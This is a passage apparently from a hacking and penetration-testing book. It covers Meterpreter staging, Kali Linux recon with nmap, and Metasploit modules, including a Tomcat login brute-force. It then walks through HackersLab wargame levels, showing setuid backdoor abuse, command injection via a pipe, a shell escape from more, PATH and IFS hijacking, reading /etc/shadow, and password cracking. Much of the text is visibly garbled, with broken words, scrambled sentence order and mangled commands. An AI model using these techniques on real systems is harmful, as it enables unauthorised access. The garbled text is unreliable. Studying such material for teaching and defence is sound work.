And..  Are  the current directory and their father respectively .  After showing us the files it has gone to the background, as we  had indicated.  This  command  performs  a  file  search;  note  that  in  a  Windows  system we have to put the double bar  \\ .    Shell: open a terminal on the target  as we have seen before            In  this  case,  we  have  uploaded  a  harmless  text  file,  but  a  malicious program such as a virus or Trojan could also be sent.   A  Trojan  is  a  program  capable  of  creating  a  backdoor  on  a computer  to  give  us  remote  access.  It's  called  that  because  it behaves like the Trojan horse of Homer's Odyssey   Ż C or how it works Meterpreter?   Meterpreter  is  a  payload  that  works  alongside  the  exploit  used without creating a new process, which makes it more effective  and stealthy . To do this, use DLL injection 1 stagers 2.  Its operation is as follows:  Target Attacker              Meterpreter  First, the exploit and the first stage 3 are sent to the target. After achieving exploitation, the stager joins the target in a task and  tries  to  communicate  again  with  the  mfsconsole  to  open communication.  Once the connection is established, the second stage is sent. If you manage to perform the DLL injection correctly, metasploit sends the  DLL  meterpreter  to  establish  a  complete  and  stable communication channel.  Finally,  meterpreter  loads  the  necessary  extensions   such  as  stdapi or priv  using the TLV 4 protocol   1                                                    In the Windows OS processes often load link libraries  din  to  mico   dynamiclink  Library .  DLLs  are files  that  perform  functions  that  are  common  to  many programs,  so  using  it  is  intended  to  promote  the modularity  of  c  or  I  say,  as  í  as  better  use  of  system resources  especially memory .  The DLL injection is a technique that lets you enter c or I say in other processes, this will force a running process to load a DLL with C or I say maliciously. This way is more to help security programs to detect it since it is to "hidden” in a regular process   2                           Stager: establishing a connection payload or n between attacker v í victim. It tries to be as m to s small ñ  os  and  reliable  as  possible  so  they  end  up  using several small ñ or size ñ or  metasploit choose them to s appropriate in each case .   3                            3  Stage: component   m or module of Stager    4                            4  Protocol TLV  Type Length Value  is a format that  can  represent  information  or  n  very  efficiently.

Chapter 6 - Kali Linux Installation  Kali Linux can be installed on a hard disk like any GNU   Linux distribution, it can also be installed and configured to perform a dual boot with a Windows Operating System, in the same way, it can be installed on a USB drive, or installed on an encrypted disk  It is suggested to review the detailed information on the various following  page:  for  Kali  Linux,  on   installation  options  http:  docs.kali.org category installation  the   Change Root Password For  a  good  security  practice,  it  is  recommended  to  change  the default password assigned to the root user. This will make it difficult for malicious users to access the system with this default password.   passwd root Enter new UNIX password: Retype new UNIX password:  [*] The password will not be displayed as long as it is written and  must be entered twice.  Starting Network Services Kali  Linux  network  services  are,  HTTP,  Mestaploit,  MySQL,  OpenVAS, and SSH.  must be executed:  If  the  HTTP  service  is  required  to  start,  the  following  command    etc init.d apache2 start These services can also be started and stopped from the menu: Applications -> Kali Linux -> System Services.  Kali  Linux  provides  official  documentation  on  several  of  its aspects  and  features.  The  documentation  is  in  constant  work  and   progress. This documentation can be located on the following page: http:  docs.kali.org   Kali Linux Tools Kali  Linux  contains  a  large  number  of  tools  obtained  from  different sources related to the field of security and forensics.  provided on the following website: http:  tools.kali.org   A  list  of  all  these  tools  and  a  quick  reference  for  them  are Shell Scripting The  Shell  Bash  allows  you  to  automate  an  action  or  perform repetitive tasks that consume a great deal of time. For the following practice, a website that publishes lists of proxies will be used.  Using  commands  from  the  bash  shell,  the  IP  addresses  and  Ports of the Proxies will be extracted to a file.   wget http:  www.us-proxy.org     grep "   " index.html  cut -d ">" -f 3,5  cut -d "<" -f 1,2   sed 's      :   g'      Capture Information This phase attempts to collect as much information as possible about  the  objective,  such  as  possible  usernames,  IP  addresses, name  servers,  and  other  relevant  information.  During  this  phase, each  piece  of  information  obtained  is  important  and  should  not  be underestimated. Bear in mind that the collection of a greater amount of  information  will  generate  a  greater  probability  for  a  satisfactory attack.  The process where information is captured can be divided in two ways - the capture of active information and the capture of passive information. In the first way, information is collected by sending traffic to  the  target  network,  such  as  performing  ICMP  ping,  and  TCP    UDP port scans. For the second case, information is obtained on the target network using third-party services or sources, such as Google, Bing, or social networks. Public Sources   There  are  various  public  resources  on  the  Internet  that  can  be used  to  collect  information  about  the  objective.  The  advantage  of using  this  type  of  resource  is  the  non-generation  of  direct  traffic towards the objective, in this way the probability of being detected is minimized.  Capture Documents The  "-dnsserver"  option  defines  the  use  of  a  particular  DNS  server for hostname queries.  The "-dns" option defines the domain to scan. The  "-wordlist"  option  defines  a  list  of  words  to  use  to  discover  subdomains.  be used with any other tool that requires it, as is the case here.  The "-file" option defines an output file.

Although there is an option in dmitry that would allow obtaining information about the host's domain from Netcraft, it is not feasible to obtain it. This information can be obtained directly from the Netcraft website:  http:  searchdns.netcraft.com   host.  Route Information Traceroute http:  linux.die.net man 8 traceroute Traceroute tracks the route taken by packets from an IP network on  its  way  to  a  specified  host.  This  uses  the  "TTL"  field  of  the  IP protocol and attempts to elicit an ICMP response TIME_EXCEEDED from each gateway through the route to the host.  The  traceroute  version  on  GNU     Linux  systems  uses  UDP  packets by default.   traceroute --help  traceroute [IP Address] Tcptraceroute http:  linux.die.net man 1 tcptraceroute tcptraceroute uses TCP packets to trace the route to the target   tcptraceroute --help    tcptraceroute [IP Address]   Use Search Engines Theharvester https:  code.google.com p theharvester   nping -h    nping [IP Address]   Nping uses the ICMP protocol by default. In case the target host  is blocking this protocol, the TCP test mode can be used.   nping --tcp [IP Address] The "--tcp" option is the mode that allows the user to create and send any type of TCP packet. These packets are sent embedded in IP packets that can also be tuned  Recognition of the Operating System This procedure tries to determine the operating system working on  the  active  objectives,  to  know  the  type  and  version  of  the   operating system to try to penetrate.  nmap http:  nmap.org   nmap -O [IP Address]  List of Services The  determination  of  the  services  in  operation  at  each  specific port can ensure a satisfactory penetration test on the target network. You can also eliminate any doubt generated during the recognition process on the operating system footprint.  Nmap http:  nmap.org   nmap -sV [IP Address]  The  “-sV”  option  of  nmap  enables  version  detection.  After discovering  the  TCP  and  UDP  ports  using  some  of  the  scans provided  by  nmap,  version  detection  interrogates  those  ports  to determine more about what is currently in operation.  The  database  contains  tests  to  consult  various  services  and expressions  of  correspondence  to  recognize  and  interpret  the responses. Nmap tries to determine the service protocol, application name, version number, hostname and device type.  Exploit the Objective After having discovered the vulnerabilities in the hosts or target network,  it  is  time  to  try  to  exploit  them.  The  exploitation  phase sometimes ends the Penetration Test process, but this depends on the  contract  because  there  are  situations  where  you  must  enter deeper  into  the  target  network,  with  the  purpose  of  expanding  the attack throughout the network and winning All possible privileges.  Repositories with Exploits Various  types  of  vulnerabilities  are  reported  every  day,  but currently, only a small part of them are exposed or published for free.   Some  of  these  "exploits"  can  be  downloaded  from  websites  where repositories are maintained.  The Metasploit Framework Console http:  www.metasploit.com  The Metasploit Console  msfconsole  is mainly used to manage the Metasploit database, manage the sessions, as well as configure and  execute  the  Metasploit  modules.  Its  essential  purpose  is exploitation. This tool allows you to connect to the target so that the exploits can be executed against it.  Since   the  Metasploit  Framework  uses  PostgreSQL  as   its database, it must be started in the first instance, and then start the Metasploit Framework console.   service postgresql start  command must be executed.  netstat -tna  grep 5432  To  verify  that  the  service  has  started  correctly,  the  following  To display the Metasploit Framework help.  msfconsole -h    msfconsole    Some of the useful commands to interact with the console are: msf> help msf> search [Module Name] msf> use [Module Name] msf> set [Option Name] [Module Name] msf> exploit msf> run msf> exit  The  following  example  details  the  use  of  the  auxiliary  module  “SMB User Enumeration  SAM EnumUsers ”.   CLI of the Metasploit Framework Metasploit  CLI   msfcli   is  one  of  the  interfaces  that  allow  the Metasploit Framework to perform its tasks. This is a good interface to learn how to manage Metasploit Framework, or to evaluate write a new exploit. It is also useful in case it is required to use it in scripts and apply automation for tasks.   msfcli -h    msfcli    msfcli [Exploit Route] [Option = Value]  The  following  example  will  use  the  auxiliary  module  called “MySQL Server Version Enumeration” which allows enumerating the version of MySQL servers.  For the following example, the auxiliary module named “Tomcat Application  Manager  Login  Utility”  will  be  used  in  the  Metasploit Framework, which will simply attempt to authenticate to the Tomcat Application Manager instance using specific users and passwords.”  msf> search tomcat msf>  use  auxiliary     scanner     http     tomcat_mgr_login  msf  auxiliary  tomcat_mgr_login > show options  msf  auxiliary   tomcat_mgr_login >  set  RHOSTS  [Objective  IP]  msf   msf auxiliary  tomcat_mgr_login > set RPORT 8180 set   auxiliary   usr share metasploit- framework data wordlists tomcat_mgr_default_users.txt   tomcat_mgr_login >   auxiliary   usr share metasploit- framework data wordlists tomcat_mgr_default_pass.txt   tomcat_mgr_login >   msf   set   USER_FILE  PASS_FILE  msf  auxiliary    tomcat_mgr_login >  exploit  msf  auxiliary   tomcat_mgr_login > back  Using common usernames Exploitation   Exploitation  Demonstration   &   Post   The demonstrations presented below allow strengthening the use of  some  tools  presented  during  the  Course.  These  demonstrations focus  on  the  Exploitation  and  Post-Exploitation  phase,  that  is,  the processes that an attacker would perform after gaining access to the system by exploiting a vulnerability.  Demonstration using a local exploit to escalate privileges.  ssh -l msfadmin 192.168.159.129 Once inside the system we proceed to use the "sudo" command.  sudo cat   etc   shadow    sudo passwd root  Enter a new password and then  your root    id    The Post Exploitation phase would be similar to the one detailed  in the first example.   Chapter 7 – Solving Level Problems  Level 0 Problem Login: level08 Password: guest Study: Introduction Level 0  Since  it  is  extremely  simple,  it  is  just  meant  to  make  you understand  some  of  the  concepts  you  will  need  to  move  on  to  the next  levels.  I  will  take  this  space  to  explain.  Our  main  objective  at level0, as in all others, is to get the password to the next level. This can be done by running the vo pass, which is in the bin directory. Try connecting  to  HackersLab  and  typing  pass.  A  screen  appears  that will wax and show you the level0 password. So to get the password for thelevel1, do I have to login as this user? How is this possible?  There is another way. At every level, there is a file that has the UID   user  identification  number   higher  than  yours  and  the  GID  Identical  group  identification  number .  The  task  is:  how  to  explore this file so that through it you can execute the pass command and get  the  next  password?  Now  if  we  do  this  through  it  and  it  has  a higher  user  privilege   UID ,  our  system  will  “think”  that  we  are  the other user. Difficult? Let's see an example.  Suppose we connect to HackersLab. Let's create one imaginary level0, just as a test: 8 Login: level08 Password: [level0 @ level0] $ whoamilevel0 [level0 @ level0] $ idUID = 2000 GID = 2000 OTHER ANY = 9999 So far, what have we achieved? We have successfully logged in to level0, we have entered the whoami command, which informed us that the username is level0, and the id command, which provided us with user IDs  UID , group IDs  GID , and other things that will not be needed for us.  Now  I  will  have  the  system  search  for  files  that  have  a UIDsuperior to ours. For example, if our UID is 2000, then I want to search for files that have UID 2001  level1 . [level0 @ level0] $ find   -uid  2001  –gid  2000   tmp     suzuki:  Permission  Denied   bin     joy:   Permission Denied  etc   test  usr   local   yu: Permission Denied  var   shenmue: Permission Denied.  I asked the system to show me all the files that they allowed and are  user  level1   which  has  UID  2001   and  group  level0   from  GID 2000 . Why look for the GID? Simple. The file needs to be from our group  so  that  we  can  manipulate  it.  This  will  become  clearer  in  a moment.  We  only  found  the     etc     test  file.  Everything  else  with Permission Denied is rubbish.  How to list, then, only the files we want? [level0 @ level0] $ find   -uid 2001 –gid 2000 2>   dev   null  etc   test Redoing the command, I included the string 2>   dev   null , which I told the system“ anything not necessary   2   send to   >   the trash     dev   null  ”. Thus, we only  got  the  result  we  expected.  So,  let's  list  the  in-file  formations. [level0 @ level0] $ ls –la   etc   test-rwx — x— 1 level1 level0 10876 Mar 8 06:24 test.  From the information, we confirmed what we wanted. It is a file created  by  user  level1  and  that  belongs  to  group  level0.  The  user who  created  it  has  the  permission  of  total  users,  group  users  are allowed  to  execute  only,  and  others  not  even  that.  Just  out  of curiosity, I could browse the file using the username instead of UID? Of course!  Perfect. We found the file the same way. How can we just run the file,  let's  try:  [level0  @  level0]  $  cd     etc[level0  @  level0  etc]  $ testError: file not found. An error has occurred. This is because our executable  file  is  not  in  PATH.  OPATH  is  a  variable  that  indicates which directories are the files that can be run from the directory you are in. We can then only co-place “. ”  dot and slash  in front of the executable. necessarily will run it without relying on PATH. [level0 @ level0 etc] $ .  test  bin   pass. Congratulations ... the password for level1 is xxxxx. Ready! In our imaginary example, the test file ran the pass  that command that gives us the password, remember? . But it gave us the password of level1 instead of 0? This was because the test  had  user  permission  from  level1,  so  we  fooled  the  pass command and it gave us the prize. At every level, this must be done   differently.  If  you  have  not  understood  this,  we  will  answer  your questions  now,  in  the  practical  part  step  by  step  and  then,  we'll connect to drill.hackerslab.org via telnet:8 Login: level08 Password: guest Connecting to level0.  We  entered.  I  typed  the  whoami  and  id  commands  to  see  the username  and  identification  numbers   IDs .  It  doesn't  have  to  be done; I just did it for your ease of understanding. We are ready to search for our target file. I typed find   -user level1 –group level0 2>   dev   null to look for files created by level1 and having level0 as a group. The system found some files, including  dev .hi. Dev means devices.  Following  the  level  hint,  I  will  try  this  file  first.  I  listed  the information and saw that it has executed permissions for users of the level0 group. So let's run it and see what happens. I typed cd   dev to access the directory where the target file is. I typed, so.hi . The system returned an error saying that the command was not found. This means that the command is not in the PATH. No problem ...we hit  a  ". "  . Apparently,nothing happened.  the  command  and  execute   front  of   . .hi   in   it:   Let's check: Let's try the id command. Oh! A surprise! A new ID has  appeared  with  EUID  number  2001   level1 .  This  EUID  didn't exist before ... it was given to us by the program. We will then try the whoami  command,  just  to  take  the  doubts.  That!!  The  command informed us that we are level1  or at least that we have permission from level1 . How could .hi do this? Simple, he was a backdoor.funds or trojan horse . The moment we ran it, he ran the  bin   sh command and  created  another  shell   command  session   within  the  first  one, but with your permissions. This means that if we try to type thepass command   which  returns  the  level  password ,  now  we  get  ...The password for the next level !!! The password for level1, then, is the newworld.   Level 1 Problem Login:   level18  Password:  newworld  Study:  External  Execution of Commands and Pipes.  The necessary knowledge to have at this level is to know how to take  advantage  of  a  program  that  executes  external  commands.  If the  program  has  an  EUID   ID   higher  than  yours,  this  can  be  a serious issue. For a demonstration, let's follow the example of level0. I will create an imaginary level1, with dummy files, as a test. Login: level18 Password: [level1 @ level1] $ find   -user level2 -group level1 2>  dev   null  usr   bin   list[level1 @ level1] $ cd   usr   bin[level1 @ level1 bin] $ .  listEnter a file:   usr   bin   list-rwx — x— level2 level1 876 Jun 23 13:12   usr   bin   list.  Let's take a slow look at what we did. We are supposed to log in to the HackersLab system, we look for the file  s  that have level2 UID and Level1 GID  if you still don't understand why the search is done  this  way,  re-read  level0 .  We  found  the  file     usr     bin     list  .I tried to run it and got it. He asked me for any file and informed me the same as we were using, just to see what would happen  could be any other . The list program then returned me information about the file I provided. The problem is there. The list executed from within it the  command  is  -lato  show  file  information.  He  performed  the following on the system: [level1 @ level1] $ ls -la   usr   bin   list-rwx — x— level2 level1 876 Jun 23 13:12   usr   bin   list But he executes with  privileges  superior  to  ours   forgot  that  your  creative  user  and IDs  are  level2??? .  So  what  can  we  do  to  add  another  command since it executes ls externally? The easier way is using the pipe     , which  we  saw  in  the  command  section.  He  will  allow  you  to  enter another command to be executed. But where will we do it? Let's run the list again: level1 @ level1 bin] $ .  list. Enter a file:   usr   bin   list Here is the secret. Instead of just putting the PATH of the file, how about we add the pipe and some command in front? Would be like this: Enter a file:   usr   bin   list  pass That! If our theory is right, it will run ls, listing ourprogram   usr   bin   list and then immediately run the program in the for-provides the passwords. Complete now: level1 @ level1 bin] $ .  list. Enter a file:   usr   bin   list  pass-rwx — x— level2 level1 876 Jun 23 13:12   usr   bin   list The password for   level2  is  ...Ready!  We  get  a  new  password.  Let's  get  to  the  real walkthrough now.  Step  by  step  Log  in  to  HackersLab  and  log  in  with  the  level1 password. The first thing to do  already classic  is type the command find   -userlevel2 -group level1 2>   dev   null to find our target file. We  found  two,     proc     20840  and     usr     bin     amos  .  But  wait  a minute ... Amos is the name of a prophet  dim, dim, dim ... we found why  this  tip  level .  Let's  check  the  amos  file,  then:  Seeing  the information  from  the  masters,  we  find  that  again  we  have  group permission to execute it  x . We managed to rotate it without needing “ .  ”  slash  before it means that it is in the PATH. How did it happen in our study session simulation? The program asks us the PATH of any  file.  We  put  the  file  we  are  currently  running   such  as  said before, can be anyone . He informed us that it is executable.  Getting  back  to  the  problem  at  this  level,  we  saw  that  Matthew had to use the file command to make the amos program. So, is the program running externally file archives? You? Let's try it out! Yes!! The sample runs the file externally. Let's try to run it and make a pipe to try to get your privilege. So let's do it the same way we study: we put the information for   usr   bin   amos, the    pipe   and the pass command. Thus, the program will have the file   usr  bin   mas  pass. Result? The password for level2. One more stage won.   Level 2 Problem Kevin,  a  BBS  programmer,  wants  to  add  an  alert  on  your homepage so your members can see your posts every time they log in.  Unfortunately,  the  message  has  more  than  one  page  and  its members cannot read it. As a result, he has been warming his brain night and day, trying to find a solution. Finally, he considered using the more command to solve your problem. However, this method is risky because of security issues. TIP: Nuff said!  Login:  level28  Password:  DoItYourself  Study:  Shells  and  Subshells  The  shell  of  a  system  is  nothing  but  the  execution  of  a  shell interpreter commands entered. It is a text-mode screen in which you can  interact  through  system  commands.  In  the  DOS  system,  for example, the command interpreter is the command.com file. At the Windows NT and compatible, it is cmd.exe. You can prove it on NT by  going  to  Start     Run  and  typing  cmd.  A  command  screen  will open.  Why  use  Windows  as  an  example?  Why  is  Linux  not  a  close different.  It  has  several  shell  types   sh,  csh,  ksh,  bash2  ...   which, when  being  run  within  a  graphical  window  manager   such  as GNOME  or  KDE ,  give  you  another  small  text-mode  window,  the command prompt bosses. To finish it, it's simple. Just close it. When you run the shell from within a window manager, you will be running in the background. This is an important concept to learn because we will use it much later. I can also run a shell inside another one. This is  called  a  subshell.  An  example  is  shown  below:  [my  system]  $ ls....rhostspasswd.old[my system] $   bin   shbash $.  In the example above, I was in a shell  where I was showing my spelled system  and moved on to another, sh  or simple bash . If I type the exit command, I go back to the previous one. This proves that  sh  is  a  subshell  because  was  within  what  was  originally  run. bash $ exit[my system] $ This can also be done through programs. Many programs of text mode that run on shells  such as pine, vi and others   allow  you  to  run  a  subshell  from  inside  them.  Even   commands like more also allow. This will be clear in the practical part of this level. Step by step We connect to HackersLab and try to list the file with permission of user level3 and group level2.  We found the alert file. Probably the same as created earlier from the  description  of  this  level  created.  Next  step:  List  it.  Execute  it. Let's do it. We ran the alert file and saw that Kevin used the more command to pause between the screens of your file. If we hit Enter, Page  Down  and  some  other  keys,  the  file  will  keep  being  shown slowly. Instead, we will do the following: We wrote the command !   bin     sh  over  —More—.  This  means  telling  the  system:  My  dear Linux, run   !   for the command interpreter sh that is inside the bin directory     bin   sh  . We fell into the shell. Like who is running the shell  is  a  program  that  has  level3  permissions,  we  tested  with whoami and are level3 ready. Running the pass, and so, there we go to level3!   Level 3 Problem Login: level38 Password: hackerproof Study: PATH and IFS  HackersLab  Levels  3  and  4  are  pretty  much  the  same,  in  the  two;  you  will need  to  understand  the  concept  of  PATH,  IFS,  and  export.  These levels  at  the  beginning  of  the  challenge  are  really  interesting  and difficult  ones   you  will  see  later  level5  and  6  are  much  easier . Although  the  book  focuses  on  how  to  break  a  Linux  system,  I  will explain  the  PATH  in  brief.  Learning  this  term  makes  it  easier  to understand others. First, let's go to the concept:  PATH  is  the  absolute  path  of  directories,  where  the  system always  looks  for  a  file  to  run.  For  example,  typing  in  the  root  of  a system the commands ls, dir, date or any other, the OS will search directoriesPATH by these commands and execute them. If not, it will return an error. Complicated? Not so much.  Let's  look  at  a  simple  example.  In  the  above  DOS  example,  I listed the data that was in the directory called test director. I found that there was a program called app.exe. I then tried to run the app from  the  root.  I  received  an  error  saying  that  the  command  is  not recognized  not found . So, I modified the PATH and pointed it to the test director where was the app. Just use PATH = C: \ directoriotest. I tried to run the app again and voila! It rolled right. Of course, now the command was inside the system search PATH. Okay, but how does this  relate  to  a  hacking  challenge?  All.  Imagine  that  a  Windows application  externally  calls  the  send  NET.EXE   the  command  that controls  the  NetBIOS  protocol,  and  may  be  connected  to  shares, sends  messages,  enables  users,  etc. .  What  would  happen  to  this program if I had created another with the same name   NET.EXE  , put  it  in  the  test  director  and  set  the  PATH?  NET  would  be  run normally by the individual program, but my NET, which could be an intrusion program like a backdoor  or horsebackTrojan .  Going back to Linux, then imagine that Steven's program simply writes the date. That's easy, just create a fake version in a directory    whichever  one  you  want  to  choose ,  move  the  PATH  there  and export it  send it back to the system .  But we have a problem ... What if his program runs directly   bin   date  instead  of  just  date?  Even  if  we  modified  PATH,  the  program would  be  running  directly  in  the  directory  ...  Now  what?  Who  can help us? The fearless IFS. The IFS or Internal Field Separator has an  interesting  feature  –  you  can  give  it  an  ASCII  character  and whenever a command is typed in the system, this character will be separated.  This  process  has  some  very  interesting  uses:  In  our problem, the Steven program runs directly   bin   date on the system. If  we  configure  IFS  as  follows:  export  IFS  =      configuring  and exporting to the system in only one line, saves time  What will this entail? Instead of the program running  bin date, it will run bin date  as two separate commands  because IFS has removed the slash. Well, if it will run date, it will fall on our nasty PATH and we'll be able to break the system ...If you still have questions, they will be taken now in the practical part.  Repeating  the   already  starting  to  get  boring   process  of connecting  to  HackersLabas  level3  and  look  for  the  file  made  by steven, we found the file today  which is curiously in the   usr   man   en   man8   directory which is the Brazilian Portuguese version of the manual that comes with Linux . We listed the file  only usual  and we saw that it has permission to execute.  Enter the file directory and type the pwd command just to confirm  to show the current directory . Try rotating the file by typing . today, this  way,  it  returns  me  the  date.  Everything  is  now  following  what was specified in the initial problem.  Enter the date command as a test and it returns the results in the common format. This is not necessary to be done, it is just curiosity. Entering  the  set  command   shows,  changes,  and  creates  system variables, we saw the PATH. The executable file date, which is used externally, is inside the bin directory. Let us then take the necessary steps – those explained in the study.   First,  I  entered  the  command  export  PATH  =     home     level3    tmp. Already, I put export in front to create the new PATH and export it  send it  to the system. This directory   home   level3   tmp is the only directory that the level3 has permission to record. This is where we will create our fake date. We create and we also export IFS by typing export IFS = .  A  little  attention  now,  the  echo     bin     pass>     home    commandlevel3   tmp   date does nothing more than create a text file named date in our record directory and send this file  echo  the text   bin   pass.  This  will  make  every  time  our  date  runs,  the   bin     pass command is run, thus showing us the password. Did it work then? At the end of the previous image, we typed again mind . today to test. It's result time….already? This is our level4 password. Smile!   Level 4 Problem Login: level4 Password: AreUReady? Study: More Deduction  and More PATH.  Level  4  is  very  similar  to  the  third.  Everything  I  showed  in  that level  study  in  the  past  applies  here.  But  there  is  a  big  difference. How  did  I  know  that?  According  to  the  problem,  Kevin  added  just one line of code in your game. This line of code could be anything ... a  message  on  the  screen,  a  comment,  or  an  external  command being executed. There is only one way you know: running the game and  trying  to  identify  some  command  it  is  running   Does  it  list directories?  Show  date?  Time? .  There  are  commands  like  strace and others you can use to try to figure out external references. But the easiest way is by trying to run the game and find out. The big difference I was referring to is this: at level3, you knew which should impersonate  the  date  command,  but  at  this  level,  besides  you knowing which command is used, you are not sure if this is the right procedure.  Only  by  analyzing  it  will  you  know.  Let's  go  to  step  by step and check how the procedure should be.  We connect to HackersLab as level4 and look for files with a per- level5  user  mission.  We  found  our  game,  the  trojan  file,  which  is inside the   usr   games directory. Let's run it to see what happens. The game prompts you to select the speed with which you want to play. That game is a kind of Tetris. An interesting thing that we saw here is that the game cleared the screen when it started. And it also cleans  the  screen  many  times  while  you  play.  Is  it  then  the  clear command, which clears the screen, running externally? Let's follow this deduction and try to proceed as at level3.  Again, we export PATH to the   home   level4   tmp directory  the only one we can record . We also exported IFS to the system. We have a file called clear inside our recording directory and we use the    bin     pass  command  inside  it.  If  that's  right  then,  when  we  run trojka, it would have the same effect as the past level, but now with the  program  executed,  we  have  cleared  the  bad  one.  So..Silent night, holy night! And onwards to level5 !   Level 5 Problem Login:  level5  Password:  Silent  night,  holy  night!  Study:  Strings in Binaries.  First, what is a string? It's a char grouping, as taught in college. In common language, it is a word, a sentence or a text. Whenever we program, we need to use strings to communicate with each other and with the user. Two examples in different languages   of strings for the user. Pascal writeln  'Enter a number' ; 8 C ++ cout >> "Enter a number \ n"; Strings are also used to make simple comparisons of words and phrases.  I  know  all  programmers  are  tired  of  seeing  this,  but  a  basic explanation  is  important  for  non-programmers  not  to  get  so  lost.  A comparison  example:  Test  Program;  varx  :  string;  beginwriteln   ' Enter  your  password:  ' ;  readln     x   ;  if  x  =  '  binladen  '  then beginwriteln  ' Correct Password ' ; endelse beginwriteln  ' Incorrect password ' ; end; end;  In  this  little  program  in  Pascal,  I  first  send  the  user  a  text requesting  your  password.  I  read  the  variable  that  contains  the password  and  then  the  comparison:  if  the  string   password   is  the same as binladen, I write in that the password is correct, otherwise, type Incorrect password. This is nothing new to anyone. Here, what is interesting to us will be the compiled program and not the source. When  we  do  not  use  an  encryption  feature  or  executables  in  our compiled program, it leaves most of our strings on display. You can see  this  using  a  hexadecimal  edit.  But  there  is  an  easier  way,  the strings command, which scans any binary file  not just executables  and  shows  you  the  strings  found.  I  will  compile  the  code  shown earlier in DOS and show the problem step by step. I did the program and tested it.  I  typed  saddamhussein  as  a  password.  It  returned  incorrect password,  so  I  tested  with  the  default  password,  binladen.  The program  returned  the  correct  password.  Soon  after,  I'll  type  the strings command progteste.exe to try and find the string binladen.   Oops  ...  Quickly,  looking  at  the  result  generated  by  the  strings command, we found four interesting lines: Type your password: bin Laden.  Correct  password  and  so  we  can  figure  out  simple passwords  without  using  neither  the  encryption  features  nor  some compression on any executable. We saw it in DOS, but what about Linux? So, let's go step by step.  We  connect  to  HackersLab  as  level5.  We  are  looking  for  the target file, the new modified backdoor location cited in the problem. We found   lib   security  pam_auth.so  file pam_auth.so within the directory   lib   security . I listed your information and again we are allowed to execute. Let's do it then.  We ran pam_auth.so and he asked for the password, we put any string of words and it returned Password incorrect. Let's first check your  directory  for  more  interesting  files.  There  are  many  files.  We would  waste  a  lot  of  time  trying  the  command  strings  in  each  and every one. So, we will try the main one, pam_auth.so. Will we find something  interesting?  We  found  several  possible  passwords: abcd1234, loveyou!, flr1234 and we will have to try all of these ones by one as a level6 password. There are also two phrases that could be passwords: what the hell are you thinking? And Best of The Best Hackerslab.  Hmmm,  this  Best  of  TheBest  Hackerslab  is  very suspicious. Let's try it first.  Best of The Best Hackerslab was the correct password. Direct to the top level. If you want, instead of going straight to logging in as level6  and  entering  the  password,  use  the  right  password  on  the backdoor to make John angry again!   Level 6 Problem Login: level6 Password: Best of The Best Hackerslab Study:  Port Scan.  This  is  one  of  the  easiest  levels  of  HackersLab.  It's  for  a  really relaxed time. It focuses on the following fact: there is a second open door for access to the system. What are these doors? Whenever you connect to a system, a "Socket" is created. A socket is nothing more than  the  IP  +  address  combination  service  door.  This  allows  the same  internet  address  to  have  multiple  services  running  as  Web Server,  FTP,  SMTP,  POP,  and  others.Some  common  port numbers:21 - FTP22 - SSH23 - TELNET25 - SMTP79 - FINGER80 - WWW3128  -  PROXY6000  –  XWINDOWSSERVER,  common  ports using TCP and UDP protocols.  I  connect   to  any  web  page   For  example:  when   like http:  www.visualbooks.com.br,  I'm  actually  connecting  to  HTTP:   www.visualbooks.com.br:80  visualbooks.com.br, on port 80, which is  the  web  standard .  So  far  it  seems  easy.  But  we  fall  into  the following  problem  -  there  are  65535  ports  for  both  TCP  and  UDP protocols. There are doors that never end anymore. How can we find out which ones are open and which aren't? By using door scanners. Port  scanners  are  applications  that  try  to  find  out  in  a  certain  IP address or host, which ports are open. They can usually use a list of most known ports, or a range  example: from 1000 to 8000 . They are usually extremely fast and results quickly return to us. Common port  scanners  perform  a  TCP  connect      on  the  most  targeted machine. This means that it performs the three TCP authentication paths     syn-  syn     ack-ack   .  Using  this  system,  it  is  easy  for  the scanner  to  discover  the  scanning  attempt.  A  firewall  or  IDS,  for example, quickly captures the hacker's IP. To end this, there are now more  sophisticated  scanners,  like  NMAP.NMAP,  which  can  scan  in many ways besides TCP connect   , has half syn    scanning  only sent  syn   ,  fin,  Xmas  and  others.  Each  type  uses  different  flags  to make it difficult to detect the scanned host. At this step-by-step level, I will use two different scanners: NMAP, for Linux, and VALHALLA for Windows and we'll try to find the port.   We connected as level6 and did the basics again. But we don't have any files now ... why? Of course ... I must find a door system access,  but  do  not  attempt  to  break  the  security  of  any  files.  Let's use NMAP first to try to detect the port. After sending NMAP to scan drill.hackerslab.org, it returned me three23, 80 and 6969. Now 23 is from  telnet,  80  from  the  webserver  and  this  6969?  Hmmm,  very suspicious. Let's move VALHALLA to Windows, then. VALHALLA is a program created by me, which besides a scanner of hosts and IPs, is a monitor of ports and portscan detector. It can be picked up at http:  www.anti-trojans.cjb.net.  Almost  the  same  result.  Found  port 23 at 80, 100 and 6969. The most suspicious for sure is 6969. Let's telnet to it and see what happens.  Just enter telnet drill.hackerslab.org 6969, placing the port in front of the name. The result came up? A login prompt similar to the usual HackersLab login appeared. Asked for my level6 password ... after typing,  bingo!  The  system  returned  to  me:  assets!!  Level7's password is Can't help falling in love. I already said this level would be easy ... no?   Level 7 Problem Login:  level7  Password:  Can't  help  falling  in  love  Study:  Breaking Unix   Linux Passwords.  Many older hackers are already used to the words DES, shadow, Cracker Jack, John the Ripper ... shame the new generation doesn't have such intimacy with these terms. Unix   Linux uses a password encryption  system  called  DES.  This  system  creates  an  encrypted string  and  places  it  in  the  security  file.system  names  which  are usually   etc   passwd. Used to use now   etc  shadow. They moved to  the  shadow  archive  hoping  to  increase  the  security,  leaving  the original password with only the usernames. Those who take control of the system can get any file, even the shadow. A typical shadow entry: mflavio: yFdrXa1EwNYng: 12126: 0: 99999: 7 ::: According to the  previous  the  username  asmflavio. Encrypted Password: yFdrXa1EwNYng. The rest of the numbers are System IDs  UID, GID, etc. .  information,  we  have   Great, I have a user's password on Linux, but it's encrypted! No problem, I'll get a program that decrypts. That sounds feasible, but that's impossible. As I said before, DES creates a hash, which is a one-way encryption system. It cannot be decrypted. But then ... how do we find out the password? Just use your imagination. Think: if the password  in  shadow  cannot  be  decrypted,  how  does  the  system compare this password with the password that the user types when logging  in?  Easy.  The  system  encrypts  the  new  password  and compares  the  two  encrypted  values.  If  they  are  equal,  that  is  the password CrackerJack and John The Ripper are programs that allow you to use a wordlist or brute force to “crack” Unix  Linux. They will encrypt each word using DES and compare it with the password that is in the password file. If the result hits ... that's the right password. Of  course,  for  this,  you  need  to  have  a  good  wordlist.  A  wordlist contains passwords commonly used and divided into categories like movie names, German words, etc ...Let's see again, in practice, how this process is done.  We log into HackersLab and look for the file with UID level8 and 